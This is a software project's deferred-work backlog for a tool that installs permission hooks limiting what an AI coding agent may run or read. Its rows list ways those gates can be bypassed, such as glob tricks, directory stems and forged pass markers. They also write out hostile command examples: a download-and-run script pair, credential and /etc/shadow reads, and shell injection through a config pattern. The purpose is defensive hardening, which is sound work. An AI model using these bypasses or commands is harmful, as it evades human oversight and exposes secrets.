# Deferred backlog — unified tracking

The single index of deferred / not-yet-fixed work. It consolidates items that
were previously scattered across `docs/changelog.md` ("Review findings recorded
but NOT fixed"), the `post-retrofit-tasks` memory, the milestone memory, and
per-session checkpoints. **This document is canonical going forward** — add new
deferrals here; the source lists remain as historical record.

**Snapshot:** `main @ 3c0a2de`, 2026-07-21 (after the 2.4.0 fold + closeout:
PR #8/#9/#10 merged, PR #4 closed). None of the items below block 2.4.0.

Status legend: `open` (actionable work) · `decision` (needs an owner call before
work) · `no-action` (reviewed, judged fine as-is; listed so it isn't re-derived)
· `done` (resolved; kept for provenance).

## A. Owner decisions (no code until decided)

| ID | Item | Notes |
|---|---|---|
| A-1 | Emitted-gate fail-open posture under a total parser outage | **DECIDED 2026-07-28 → fail-closed** (v2.6.0, upstream P0-3b). Blocking gates exit 2 with a reason when neither `jq` nor `python3` exists; advisory hooks declare `FAIL_CLOSED=0` and degrade to a logged no-op. `tests/test_retrofit.py` T2.FS7b re-pointed to the new posture. `done` |
| A-2 | Accept-or-schedule this deferred set | Formally treat as deferred-not-forgotten, or queue clusters. `decision` |
| A-3 | Shell-parity judgment call (Milestone B) | SDK gates stricter than the 2.0.0 shell gates on edge cases; parity is a follow-up PR if wanted. `decision` |
| A-4 | Trajectory pruning | `purge_old_state_after_days` has no consumer; auto-deletion unimplemented (new destructive behavior). Partially addressed at v2.6.0 — `.decision-pending-*` is swept on a 7-day window and `hooks.log` rotates at 1 MiB (upstream P3) — but trajectory files under `.claude/logs/` remain unpruned. `decision` |
| A-5 | **Should a `retrofit` install fail closed during its warn-only weeks?** (lens B finding 5) | **REOPENS the retrofit half of A-1.** A-1 was closed for greenfield at v2.6.0 and that half stands: the report demonstrated an executed fail-open in a security gate, and leaving it open pending a decision means continuing to ship it. What was *not* in scope was deciding it for **retrofit**. On `mode: retrofit` with `ROLLOUT_WEEK: 1`, a parser outage now blocks `spec-gate-commit`, `test-gate` and `tdd-gate` — in a week `RETROFIT.md:1250-1255` says blocks **"Nothing (warn-only mode)"**, for the reason the same document gives at `:1246`: day-one blocking *"produces immediate friction that drives bypass behavior"*. A brownfield operator whose week-1 commits are refused with `BLOCKED (fail-closed): unexpected hook error` is precisely the trainer R8.A.6 exists to prevent. **Mechanically available either way:** the ordering is the cause — the retrofit preamble's first act is `CMD="$(jget …)"`, so `hook_fail` fires before `retrofit_should_block` is consulted, but `ROLLOUT_WEEK` is read with `grep -oE` from `rollout-schedule.md` and needs no JSON parser, so it could be resolved first and `FAIL_CLOSED=0` set for a hook the schedule says is warn-only. `secrets-gate` stays fail-closed unconditionally either way (`RETROFIT.md:1134`). **Practical severity is bounded and should be said plainly:** `python3` is a hard prerequisite of the installer, so any machine that ran `bootstrap-install` has a parser; the realistic trigger is a stripped hook environment. **NOT IMPLEMENTED — current behavior (fail-closed in all weeks) is left in place pending the owner's call**, because silently deciding an open owner decision is the exact criticism lens B makes of the previous round. Related disclosure, currently recorded nowhere in the emitted tree: under a *total* parser outage every `PreToolUse` gate exits 2, so every `Bash`/`Read`/`Write`/`Edit`/`Grep`/`Glob` call is refused and the harness is inoperable with no bypass path. That is the posture the upstream report asked for, but an operator should be told it exists | `decision` — **owner** |
| A-6 | **What should `spec-gate-commit`'s predicate actually be?** (lens B finding 6, and the upstream report's own escalation) | P1-2 had **two** structural failures. Failure 1 (the bootstrap commit is impossible — the gate blocked its own `INDEX.md`) is fixed by `ENFORCED_PREFIXES`, now on both substrates. Failure 2 is **not fixed and is not fixable by scoping**: *"the first **code** commit is impossible — `spec-decompose` deliberately produces tasks and behaviors, not filenames, so no source path is ever in the corpus."* Scoping to `src/` does not soften that; it *targets exactly* the files a behavior-oriented task corpus will never name. Executed against a realistic post-`/spec-decompose` corpus, a staged `src/auth.gleam` is still refused. The upstream report escalated this as *"a design question for the maintainer, not just a patch"* and it still is. The shape of the question: should the gate match on **paths** at all, or on something a behavior corpus does contain (spec slug ↔ directory convention, a task-id trailer in the commit message, an explicit `covers:` line in `tasks/*.md`)? Each is a protocol-level convention change, not a hook edit | `decision` — **owner** |

## B. Seam follow-ups (from the 2.0.0 re-cut, PR #10)

| ID | Item | Notes |
|---|---|---|
| B-1 | `SATISFIES_SEAM_VERSION` constant | §8.1 says a protocol commit declares which `seam_version`(s) it satisfies; nothing in code declares it. Bootstrap-side gap. `open` |
| B-2 | `tessera_prd` floor re-cut | Awaits the absorbing Tessera version (P-5 window). Note: re-pinning `targets_seam_version` alone greens check-0 before any runner consumes `build_hooks`. `open` (blocked on Tessera roadmap) |
| B-3 | `claude_code_json_schema_range: TBD` | Open by design (Tessera-runbook referent); resolve when the matrix is known. `open` (blocked) |

## C. 2.2.0 / 2.4.0-fold deferred items

| ID | Item | Source |
|---|---|---|
| C-1 | GR2-03a surfacing notice — fail-loud, non-blocking on model/runtime change (constraints locked, not built) | changelog / milestone memory. `open` |
| C-2 | Retrofit opt-in state-schema — retrofit plans emit `telemetry.md` (and, if hand-set, `design.md`) without matching state fields; `_write_retrofit_state` carries neither `telemetry_export_enabled` nor the two design flags | changelog "recorded but NOT fixed"; extended 2026-07-27 (release review) to cover the design flags. `open` |
| C-3 | Doc-citation normalization pass — pre-existing hook/wrapper citations at older versions (incl. `§6.D` refs) | changelog. `open` |
| C-4 | R8 — eighth IC check (AR2-09b): NOT added at 2.2.0 (golden fixtures + R7 cover the repo-side risk); a forward feature with a recorded cost-of-deferral | changelog `### R8 — Eighth IC check: deferred (AR2-09b)`; `ic_checks.py` has only IC-1..IC-7. `decision` |
| C-5 | AR2-09a — no standalone run-summary template file is emitted (the run-summary is inline in the wrappers) | `templates.py:1083` "[AR2-09a]"; milestone memory. `decision` |

## D. Sub-cap review findings (changelog "recorded but NOT fixed")

Small correctness/cleanup items below the reported cap. `open` unless the row itself says otherwise.

| ID | Item |
|---|---|
| D-1 | Progress template `../../learnings/` link → `.claude/learnings/`, but retrofit calibration ledger sits at repo-root `learnings/` (neither mode creates the dir) |
| D-2 | Duplicated ~110-word telemetry question text in `render_interview` vs `run_interactive` (drifted; test pins only one copy) |
| D-3 | `_body_of` helper defined *after* its call sites → two bare-`IndexError` lookups |
| D-4 | Two determinism checks strictly implied by the whole-plan digest check (redundant) |
| D-5 | Dead `not pv` arm in `_telemetry`'s guard (`PROTOCOL_VERSION` is a module literal) |
| D-6 | Redundant proposal rebuild in `test_interview.py` |
| D-7 | Assumption-ledger drift row cites drift-detector config even when `hooks.drift_detector: false` (untested config) |
| D-8 | Freeze-exception ledger numbering not continued by v2.4.0 blocks (format fixed, sequential numbering not) |
| D-9 | Per-task wrapper `log()` emits a literal `\n` (a `.format`-doubling quirk), so its `hooks.log` entries share one physical line. **FIXED 2026-07-30, and this row's own claim was wrong:** it said the correct single-backslash form was in "`auto.sh`/`loop.sh`". Executed — `loop.sh` and `goal-loop.sh` were BOTH broken and only `auto.sh` was right, so a fixer working from this row would have inspected `loop.sh`, seen it named as correct, and fixed one of the two sites. The cited line numbers had also drifted (row said `templates.py:1444`, I-8 said `:1519`; the live sites were `:3269` and `:3344`, with the correct form at `:3089`). Same class as I-11 — a tracking row describing a version of the artifact that no longer exists. Pinned by `tests/test_wrapper_behavior.py` **Status: `done`** |

## E. Post-retrofit test-coverage queue

Source: `post-retrofit-tasks` memory. Landing structure: a `tests/smoke/` dir.

| ID | Item | Status |
|---|---|---|
| E-1 | E2E CLI smoke (#2) — dry-run vs real greenfield + retrofit fixtures; catches argparse-layer breakage the unit tests bypass | `open` |
| E-2 | Cross-mode regression matrix (#3) — retrofit-install fixture A, then run greenfield suite vs fixture B in-process; proves no global-state leakage | `open` |
| E-3 | `tests/smoke/` layout (#6) — landing dir for E-1/E-2 with golden-tree diff | `open` |
| — | `bin/run-tests` (#4) | `done` — PR #9 |
| — | CI (#5) | `done` — Milestone A (`ic-self-check.yml`) |
| — | Interactive walkthrough test (#1) | `done` — PR #2 |

## F. Lower-priority (2026-05-19 checkpoint + Milestone-B carry-over)

| ID | Item | Source |
|---|---|---|
| F-1 | test-gate grandfather clause — per-module exemption from the `inventory/testing.md` no-test list | 2026-05-19 checkpoint. `open` |
| F-2 | Widen `inventory_scan.py` pyproject regex — misses bare `fastapi` without a version | 2026-05-19 checkpoint. `open` |
| F-3 | Refactor `propose_commands` to take a root path instead of `os.getcwd()` | 2026-05-19 checkpoint. `open` |
| F-4 | Phase 9.6 unnamed config keys — spec decision for retry posture / completion-criteria checklist / audio-cue overrides (currently comments, no keys) | milestone memory / Milestone-B carry-over (NOT the 2026-05-19 checkpoint). `decision` |

## G. Retrofit adversarial-review deferrals (Round 3, v1.6.3)

Source: `post-retrofit-tasks` memory. All `open` unless noted.

| ID | Item |
|---|---|
| G-A4 | Parallel retrofit templates (`_retrofit_claude_md`/implementer/reviewer) not composed — add a mirror-assertion or "byte-mirrors greenfield" docstring |
| G-A5 | `mode_selection_ledger` milestone counter should count non-empty rows, not raw row count |
| G-B1 | `--force` is global; would need per-file scope (Round-3 wrapper guard mitigates the worst case) |
| G-B3 | `legacy_allowlist` rendered in input order — sort-before-emit is the clean follow-up |
| G-D1 | T2 AD class single-case — adversarial hardening (newline-injection, Unicode confusables, kilobyte allowlists) |
| G-D2 | FS5 semantic disambiguation comment (one-line cosmetic) |
| G-F1 | `bootstrap_protocol_version` is write-only telemetry — startup version-mismatch check is a v1.7.x conversation |
| G-F2 | Documented migration path when BOOTSTRAP bumps — RETROFIT-COMPANION change, not installer code |
| G-G2 | Validator/B5 error-message coupling → two-iteration fix cycles (one-line cosmetic) |

## H. Round-2 adversarial-review items — reviewed, no action

Recorded so they aren't re-derived; each judged defensible as-is. All `no-action`.

| ID | Item |
|---|---|
| H-4.2 | Installer seeds `r08_committed` via setdefault — initial-seed contract is defensible post C1+C2 fix |
| H-5.2 | Protocol-version lifecycle — `state.update` semantics are the operator-expected outcome |
| H-3.1 | jq-garbage discrimination — already T2-safe via strict `[ "$_val" = "true" ]` |
| H-3.3 | Two-seam independence — a third runtime seam would significantly grow the preamble |
| H-2.2 | TEMPLATES dict cardinality arithmetic in a commit message — pedantic |

## I. v2.5.0 release-review findings (2026-07-27)

Source: the final holistic adversarial review of the v2.5.0 release candidate
(PRD/Companion requirement-tracing plus scratch installs that executed the
emitted hooks). The review's three fix-before-tag items (F1 disclosure, F2/A-5
Stop-hook gate, F3 jq-fallback booleans) were fixed in the tagged release
(freeze-exception no. 16); the rows below are the recorded residue.

| ID | Item | Notes |
|---|---|---|
| I-1 | Emitted drift/alarm layer is a tier-1 tool-call notice only — tier-2/tier-3 escalation, the tier-3 hard block + `.drift-tier3-*` sentinel, audio dispatch, and the duration/file-read triggers of PRD §6.E are NOT implemented; `audio-alerts.config` now says so and thresholds are baked at install time | `decision` — implement §6.E, or keep the layer advisory and ripple the honest scope into the next PRD rev |
| I-2 | Agent-side autonomous cooperation contract absent from the emitted greenfield tree: no CLAUDE.md loop/goal addenda (Phase 8), no implementer variant blocks (Phase 7 step 3 — sentinel/decision-log/iteration-summary protocol), greenfield `spec-decompose` is a stub with no five-criterion/sixth-criterion classifier or queue-population step while the wrappers hard-require `loop_eligible`/`goal_supervised_eligible`; retrofit DOES emit a real classifier skill (parity inversion) | `open` — highest-value cluster; pairs with E-1/E-2 |
| I-3 | Spec-side: PRD self-contradicts on the version literal Phase 0 writes (`:312` says "2.0.1"; `:1298/:1478/:1837` say "2.0.0"; Companion says a v2.5.0 wizard writes "2.5.0" — impl correctly writes 2.5.0); PRD DELTA-01 head note asserts a header string the artifact never carried | `open` — next PRD doc rev |
| I-4 | Phase 0 step 6 "use verbatim" strings for 9.6/9.7 + the 9.7 trust-ramp surfacing never reached `interview.py` (TEL-01/DS-01 twins ARE byte-pinned; the autonomous-mode asks are plain true/false) | `open` |
| I-5 | Shell `test-gate` staleness check finds only `src/`; the SDK gate covers `("src","lib")` and claims parity — a lib/-only project passes the shell gate forever after one green run | `done` in the two-lens batch — dissolved rather than fixed. Both substrates dropped the pass-marker cache entirely (lens A F4: it was agent-writable and no gate protected it), and the staleness walk went with it, so there are no longer two caches to disagree |
| I-6 | Empty-command degradation: only `commands.test` fails loud with a TODO; empty lint/format degrade to `true` and `ci-mirror` silently passes pushes printing "CI mirror: true" | `open` |
| I-7 | Retrofit `rollout-schedule.md` week table vs behavior: only 3 of 11 hooks honor `ROLLOUT_WEEK` (dependency-gate and ci-mirror block in week 1 against the table's "Nothing" row; the week-2 lint row is unreachable — format-lint never blocks) | `open` |
| I-8 | Second site of the D-9 escape-doubling class: the `O_CREAT\|O_EXCL` claim sentinel is written with `printf '%s\\n'`, so `.loop-active-*`/`.goal-active-*` contain `<pid>` plus a literal backslash-n; pair with D-9 for one fix | `done` — **FIXED 2026-07-30** together with D-9, as the row suggested. Cosmetic in effect — nothing reads the sentinel body; `auto.sh` parses `.run-active`, which was already correct — but it is the same emission bug and both sites are now asserted by `tests/test_wrapper_behavior.py` |
| I-9 | Garbage values for the three opt-in flags exit via an uncaught `ValueError` traceback with exit 1, unlike `resolve_config`'s clean validation block with exit 2 | `open` |
| I-10 | `_command_warnings` / `_retrofit_warnings` are computed but never surfaced by the shipped CLI (`bin/bootstrap-install`); only the plugin command references them | `open` |
| I-11 | `dependency-gate` pattern list misses `uv add`, `poetry add`, `pipenv install`, `cargo add`, `bun add` (all verified rc=0) | **CORRECTED 2026-07-29 (round-4).** The row is stale in the SAFE direction and was never updated after a later batch closed it. Executed at round-4 HEAD on both substrates: `cargo add evil`, `uv add evil` and `poetry add evil` all **deny** (corpus CP-03/04/05); `pipenv install` and `bun add` deny through the same `TOOLS`/`VERBS` anchor. The "all verified rc=0" claim describes a version of the gate that no longer exists. Worth correcting because a stale `open` row is how work gets redone, and because the same file's stale rows in the UNSAFE direction (J-15, J-1) are the dangerous version of the same habit | `done` |
| I-12 | `sdk_gates/gates.py` callables raise `AttributeError` on a non-dict payload where the shell hooks degrade gracefully; fail-open/fail-closed disposition of a raising PreToolUse hook is the consumer's | `decision` |
| I-13 | `iteration-summary-enforcement` matches ANY `.iteration-summary-*` file, not the current iteration's (the Stop payload carries no task/iteration identity); a stale summary satisfies it forever | `open` |
| I-14 | PRD Phase 2 says interview answers fill `design.md`'s Project-specifics block; the emitted body deliberately ships a signposted placeholder (pre-specified in VALIDATION §5 — don't-guess). Recorded as an intended divergence so it stops being re-derived | `no-action` |
| I-15 | `learnings/mode-selection.md` (the calibration ledger) is emitted **only** by the retrofit overlay (`installer.py:477`, inside the `goal_in` branch). PRD §9.6 step 10 ("Initialize `learnings/mode-selection.md`"), that phase's exit criteria, and the Phase 0.5 preview all require it for **greenfield** goal-mode installs; a `goal_supervised_mode_enabled: true` greenfield dry-run creates the four wrapper/config files and nothing under `learnings/`. Class: DELTA-03 (spec requires, impl omits, tests written from the impl so all suites stay green). Pairs with D-1, which notes neither mode creates the `learnings/` dir at all. Found 2026-07-28 | `open` |

Also verified and left alone by the review (do not re-derive): the seam
binding `2.4.0 @ 251f82f` while main tags 2.5.0 is conformant (commit-pinned
consumers; pin-bump on adoption); wrapper skeletons are conformant under
B-1(b); secrets-gate path-only matching matches its spec.

## J. v2.6.0 upstream-fix residue (2026-07-28)

Sources: `docs/bootstrap-protocol-upstream-bugs-2026-07-28.md` and the two
adversarial lenses run against the fixes themselves —
`docs/lens-a-execution-findings-2026-07-28.md` (F1–F10, execution) and
`docs/lens-b-execution-findings-2026-07-28.md` (findings 1–15, spec conformance
and regression).

**Correction, 2026-07-28.** This section used to open with *"Every P0/P1/P2/P3
finding in that report was fixed at v2.6.0."* That was false when written:
P1-2's second structural failure, P2-4's Under half, and P2-5's
reason-distinguishing half were not fixed, and cluster J recorded none of them.
The two-lens batch fixed most of the residue and the rows below are what it
deliberately left. The rule the false sentence violated is worth stating: a
cluster whose purpose is *"what those fixes deliberately left"* must not
contain the word "every" about work it did not measure.

| ID | Item | Notes |
|---|---|---|
| J-1 | **Quoted-argument verbs no longer match.** `sh -c "git commit"` and friends were caught by the old substring matching; anchoring to command position (P1-4) drops them. Accepted deliberately — the alternative is every false positive the report documented | **SURFACED 2026-07-29 (round-4) — this row now describes NEITHER substrate and retiring it is an OWNER call, not an implementer one.** Round 3 gave the shell's `cmd_has_verb` invoker re-segmentation and did not give it to the SDK's `_git_verb`, so `sh -c 'git commit -m x'` was shell=deny / SDK=allow — a divergence in the direction `sdk_gates_template`'s own binding rule forbids. Round 4 made both substrates DENY it (`_git_verb` now calls `_expand_invoker_args`), because leaving them disagreeing was not an option and allow was the fail-open side. **That is a substrate-parity fix, not a decision to retire J-1**: the recorded trade-off said an invoker's quoted argument should stay unmatched to avoid false positives, and the round-4 model says an invoker's argument is a command line. Both cannot hold. The corpus pins the rows `OPEN` rather than `want=deny` for exactly this reason | **DECIDED 2026-07-30 (v2.6.0 release review): yes, `sh -c "git commit"` IS a commit.** The round-4 model wins and the report's accepted trade-off is retired. Rationale: both substrates already deny it, the alternative direction is the fail-open side, and reverting would re-split the substrates that round 4 deliberately reconciled. Executed at review time — `sh -c`, `bash -c`, `ssh host "…"` and depth-3 nesting all deny on test-gate and ci-mirror; `sh -c "git status"` and `echo "git commit"` still allow, so the false-positive property anchoring bought is intact. **The v2.6.0 PRD §6.D item stated the retired trade-off as current fact and is corrected** — the checklist now requires the invoker rule rather than recording its absence. Residue for a future batch: the emitted hooks' shared header comment ("KNOWN AND ACCEPTED LIMITATION") and the corpus rows still carry the old model; neither is operator-facing, both should be re-pointed at this decision | `done` |
| J-2 | `ENFORCED_PREFIXES` (spec-gate-commit, P1-2) is an editable constant baked into the emitted hook, not a `bootstrap.config.yaml` field. The report called the predicate "configurable"; this is the cheap half. **Now ported to the SDK substrate too** (two-lens batch) so the two agree, but it is still a constant in both. Note this is the *lesser* half of P1-2's residue — see A-5 | `open` |
| J-3 | ~~The SDK substrate carries no Bash-side `secrets-gate` closure … guarded by `permissions.deny` only … asserted in `test_sdk_gates.py`.~~ **Both halves of that row were false, and the gap is now FIXED (two-lens batch, lens A F7).** The emitted deny list contained only `Read`/`Edit`/`Write` rules and no `Bash` rule — Claude Code's path rules do not evaluate command strings — so the route was guarded by *nothing*, not by "`permissions.deny` only". And the assertion cited as proof it was "not silently tolerated" tested `getattr(gates_mod, "_BASH_GATES", {})`, a symbol that has never existed in this repo, making it unconditionally true. `_GATE_EXTRA_MATCHERS` now mirrors `HOOK_EXTRA_EVENTS` and is asserted by equality, and `tests/test_substrate_differential.py` executes the corpus on both substrates | `done` |
| J-4 | Report acceptance criterion 6 — **a tagged release**. ~~Still zero tags in this repo.~~ **Corrected 2026-07-28 (lens B finding 13):** an annotated `v2.5.0` tag dated 2026-07-27 points at an ancestor of HEAD, so criterion 6 is *satisfied for 2.5.0* and pending only for this line of work. J-4's status as "the release blocker" rested on a premise the repo contradicts. Criterion 7 (re-run the two executing lenses against a fresh install of the FIXED version) is deliberately left to an independent reviewer | `open` — tag when 2.6.x is released; no longer a blocker on a false premise |
| J-5 | `permissions.deny` rules are emitted from `never_read_paths` verbatim. **Resolved by reasoning (lens B finding 9), not executed:** under gitignore-style rule semantics the deny list is a strict *subset* of the hook's coverage, never a superset — `secrets/**` contains a `/` so it anchors to the settings directory and misses `sub/secrets/x.txt`, and `.env*` does not match `config.env`. The hook blocks both. So the dialects differ, the divergence is one-directional, and the risk is a *weaker* backstop rather than spurious blocks. The hook remains the enforcement point | `no-action` — benign direction; re-open only if a live harness shows otherwise |
| J-6 | `cost.jsonl` → `session-events.jsonl` is a rename of an emitted artifact. Anything downstream reading the old path breaks. Judged safe (it recorded no cost) but it is a consumer-visible rename inside a MINOR | `no-action` |
| J-7 | **`dependency-gate` segments on separators inside quoted strings.** The finding-1 fix splits the command on newlines and `;&\|` and judges each segment on its own; a separator inside a quoted argument therefore starts a new segment, so `git commit -m "fix; npm install evil"` blocks. Deny-list bias is over-match, and the message names the token, so the cause is legible. The obvious mitigation — skip segments with an unbalanced quote — fixes it in the **fail-open** direction and was declined. *(Note the deliberate asymmetry with `secrets-gate`, which after lens B finding 4 does the opposite and treats a quoted run as one token. The gates differ because the costs differ: a false block on `dependency-gate` names one package and is cleared by editing `deps.md`, while a false block on `secrets-gate` fires on any prose mentioning `.env` and has no override path at all.)* **RETIRED 2026-07-29 (round-2 batch 2b).** `cmd_segments` is quote-aware on both substrates now, so `git commit -m "fix; npm install evil"` reaches the gate as one segment and is allowed — which is *correct*, not a relaxation: a `;` inside a quoted argument is not a separator to the shell either, so that install never runs. The unquoted spelling still blocks, and both shapes are pinned in `test_substrate_differential.py`. The asymmetry with `secrets-gate` is also gone: both now treat a quoted run as one token, and both re-tokenize it only in a shell invoker's argument position (see J-15). The premise that the only alternative was an unbalanced-quote hack was wrong — proper quote tracking was the third option and it fails open nowhere. What forced the issue was F-435: the same quote-blindness was fail-**open** in `cmd_has_verb`, and only the fail-closed half had ever been recorded | `done` |
| J-8 | **P2-4's "Under" half is not fixed** — and, unlike the rows above, was *claimed* fixed. The `0ec72d0` commit message said dot-segment matching "satisfies T-1 and P2-4 together"; it satisfies the **Over** half only. Still allowed: `~/.aws/credentials`, `~/.netrc`, `~/.git-credentials`, `credentials.json`, `docker-compose.prod.yml`, `../../etc/passwd`, `/etc/shadow`. **What was deliberately NOT done, and why:** (a) no project-boundary check and no `../` traversal check — the gate matches path *shape*, and deciding that reads outside the project root are refusable is a policy change with a wide blast radius on ordinary work (`cat ../sibling/README.md`); (b) no file-*content* inspection — a gate that greps every read for credential shapes is a different mechanism with a different false-positive profile; (c) **the default `never_read_paths` list was not widened.** That list is operator config, and what a bootstrap project denies by default is the owner's policy call, not the implementer's — the gate correctly enforces whatever is configured. Lens B's own disposition put this finding under "record, do not fix" | `decision` — owner: widen the default deny list, and/or add a boundary/traversal check |
| J-9 | **`.last-eval-pass` is still an agent-writable file a gate trusts.** `test-gate`'s twin was closed by deleting the marker outright (lens A F4), but `eval-gate` has no configured eval command to run in its place, so the marker is the only mechanism it has. Mitigated, not fixed: `settings.json` now emits `Write`/`Edit` denies for the path, which the harness enforces independently of the hook. A Bash `touch` still reaches it — the deny list carries no `Bash` rule (see J-5) — so this is a real residual, not a closed one | `open` — needs a `commands.eval` config field before the marker can go |
| J-10 | **Two-step remote-script execution is not blocked.** `curl https://x.sh > /tmp/a.sh; bash /tmp/a.sh` (the single-pipe form *is* blocked, and the `curl … \| sh` detector deliberately runs before segmentation so it can read across the pipe). Blocking `bash <path>` generically would fire on every ordinary script invocation; correlating a download in one segment with an execution in another is state the gate does not have | **CLOSED 2026-07-29 (round-4 D20), and the recorded rationale was the thing that was wrong.** This row declined the fix on the grounds that "blocking `bash <path>` generically would fire on every ordinary script invocation" and that correlating segments is "state the gate does not have". Both premises assumed a ONE-half rule. The implemented rule needs BOTH halves in the same command: a DOWNLOADER that writes a path, and an interpreter that runs THAT path. `curl -o out.json url` alone allows; `sh ./deploy.sh` alone allows; `curl url > /tmp/a.sh && sh /tmp/a.sh` and `curl -o /tmp/a.sh url; bash /tmp/a.sh` deny, on both substrates. The correlating state is one pass over the segments the gate already computes | `done` |
| J-11 | **`secrets-gate` cannot resolve globs or arbitrary expansions in a Bash command.** `cat .en?` and `cat .{env}` still pass (the shell would expand them; the gate sees the literal token). Fixed in the same pass: intra-token quoting (`cat .en''v`), backslash escapes (`cat .en\v`) and strictly-shaped assignments (`F=.env; cat $F`) — see lens A F8. The residue is the class that requires *evaluating* shell syntax rather than tokenizing it, which a static string scan cannot do; `permissions.deny` is the backstop, and each case needs deliberate intent | `no-action` — inherent limit of scanning a command string |
| J-12 | **`git -c core.editor='vi x' commit` is not matched by `cmd_has_verb`.** The git-global-option run is `( +-[Cc] +[^ ]+\| +-[^ ]+)*`, so an option whose *value contains a space* terminates the run before the verb. Adding a quoted-run alternation to the anchor is possible but materially complicates a regex that four gates share and that must stay pure-bash (lens A F5) | `open` — low frequency, unblocks nothing |
| J-14 | **A bare directory STEM is not blocked on the Bash surface.** `cd secrets; cat prod.yaml` and `tar cf /tmp/s.tar secrets` exit 0; `tar cf /tmp/s.tar secrets/`, `cd secrets/prod` and `cp secrets/prod.yaml /tmp` all still block, as does `Grep{"path":"secrets"}` (the form lens A F6 actually executed). The two-lens batch blocked the bare stem everywhere and that also blocked `grep secrets README.md`, `git commit -m secrets` and `echo secrets` — lens B finding 4's failure mode returning through a different door, in the gate with no override path. Nothing in a token stream distinguishes the path in `cd secrets` from the prose in `git commit -m secrets`; the gate does not track argument position, deliberately. The over-match is paid on ordinary work in every session, the under-match only against an agent already moving a directory wholesale — which has routes the deny-list never covered anyway (`cp -r secrets /tmp/x`, then read the copy). A tripwire that fires on prose gets deleted; a tripwire with a known gap stays installed. **Premise partly outdated 2026-07-29:** the round-2 quoted-run rule added COMMAND-position tracking to both substrates (`_SG_CMDPOS` / `at_cmdpos`), so the "the gate does not track argument position" reason no longer holds as stated. What is still missing is *argument* position — knowing that the token after `cd` is a path while the token after `echo` is not — which is a per-command argument model, not the per-command-word one now present. Closing J-14 is therefore cheaper than it was, and is now a decision rather than a rewrite | `decision` — reason superseded; owner: is a bare stem after a directory-taking command a path? |
| J-16 | **`test-gate` lost run-once-per-source-change idempotency, and a heredoc body still triggers it.** Removing the forgeable `.last-test-pass` marker (lens A F4) was right — whatever the gate can compute, an agent holding Write can compute and write — but nothing replaced the *idempotency* the marker also provided, so the suite now runs on every commit attempt and every retry, between `git add` and `git commit`. A test command that rewrites a staged file therefore makes the commit record stale content. Separately, `cmd_segments` treats a heredoc body as ordinary command text, so writing a CONTRIBUTING.md or release script that merely *contains* a `git commit` line runs the whole suite and blocks the write if it is red. Residue: `.last-test-pass` is still emitted into `.claude/.gitignore` for a file nothing creates. Closing the first half needs a non-forgeable signal (a content digest the gate computes and keeps outside the project tree, or a harness-provided run id); the second needs the segmenter to skip heredoc bodies, which means tracking `<<`/`<<-` delimiters | `decision` — owner: is a non-forgeable idempotency signal worth the mechanism, or is running the suite every time the correct posture? |
| J-21 | **`mode: retrofit` is out of scope by owner decision (2026-07-29) and is untested by construction.** Greenfield is the priority; retrofit is tracked here so the deferral is recorded rather than assumed. Two things are queued: (a) the retrofit preamble calls `retrofit_is_allowlisted "$TARGET"` on the RAW `jget` value while the greenfield body it wraps normalizes absolute paths, so the legacy allowlist is inert on the path shape the harness actually sends — confirmed by execution at `ROLLOUT_WEEK: 4` (relative `src/x.py` rc=0 exempt, absolute `/abs/proj/src/x.py` rc=2); (b) there is **no `mode: retrofit` golden fixture** in `tests/test_greenfield_golden.py` and **zero retrofit rows** in `tests/test_substrate_differential.py`, so retrofit hook bodies are digest-pinned and differential-checked by nothing. (b) is why the same retrofit-twin finding has now recurred across three consecutive rounds. NOTE the coupling that makes this cheap to get wrong: `_hook_body_retrofit` prefixes a preamble onto the GREENFIELD body, so every shared-header change reaches all retrofit hooks whether they are tested or not — `tests/test_retrofit.py` (263 checks) is the only tripwire | `open` — deferred by scope, not by judgment; revisit after the greenfield round lands |
| J-17 | **A `never_read_paths` entry can inject shell into the emitted hook.** CONFIRMED by execution (round-3 lens C): a pattern of `PAT_EOF` terminates the quoted heredoc that carries the pattern list, and subsequent entries become command lines in `secrets-gate.sh`. A pattern of `touch /tmp/x` then runs on every hook invocation. With a non-executable pattern the ERR trap converts it into a permanent `rc=2` on every payload — a total DoS no test catches. Present at **every commit in this chain**, so not introduced by any review round, but unrecorded until now and in the same emit path as the original P0-1 RCE. `lib/installer.py` validates `never_read_paths` nowhere. The config is operator-authored, so this is privilege-equivalent rather than a privilege escalation — but the installer should still refuse a pattern containing the heredoc sentinel, a newline, or a leading `-` | **FIXED 2026-07-29 (round-4 D12), and the "privilege-equivalent rather than a privilege escalation" framing is what made `open` look defensible for three rounds.** The framing is also wrong about the blast radius: the config is operator-authored, but the emitted hook runs on EVERY tool call, so a poisoned entry is a persistent execution primitive, and the pattern array is silently TRUNCATED so the protections the operator asked for stop existing with rc=0 and no warning. It was also not "the last unvalidated path" — it was one of FOUR: `deps.approved` shares the identical heredoc (and its `mapfile` sits above every early exit, so a poisoned entry bricks dependency-gate to rc=2 on every PreToolUse call), `hooks.drift_*` is interpolated unquoted into `[ "$n" -ge <value> ]`, and `commands.*` emits a hook bash cannot parse. All four validate at `resolve_config` now | `done` |
| J-18 | **`eval-gate`'s two substrates diff different ranges.** The shell diffs `HEAD~1`; the SDK diffs `@{u}..HEAD`. With two unpushed commits and the prompt file in the OLDER one, shell allows and SDK denies — a binding-rule violation, present at every commit in this chain and in both directions depending on history shape. The differential's eval-gate section has no `deny` rows at all, so it can see neither | **FIXED 2026-07-29 (round-4 D4).** Each substrate had a range the other lacked, which is why reading this as "the shell is the complete one" would have left half of it open: the shell had the root-commit `git ls-tree` branch and no upstream range; the SDK had `@{u}..HEAD` and no root-commit branch, so on a shallow clone (`actions/checkout` defaults to `--depth 1`) it saw an empty diff and ALLOWED. Both now carry all three ranges in the same order, and the SDK's `prompt|\.md$` predicate is narrowed to the shell's `*[Pp]rompt*|prompts/*|*/prompts/*` so a docs-only push stops being denied on one substrate only | `done` |
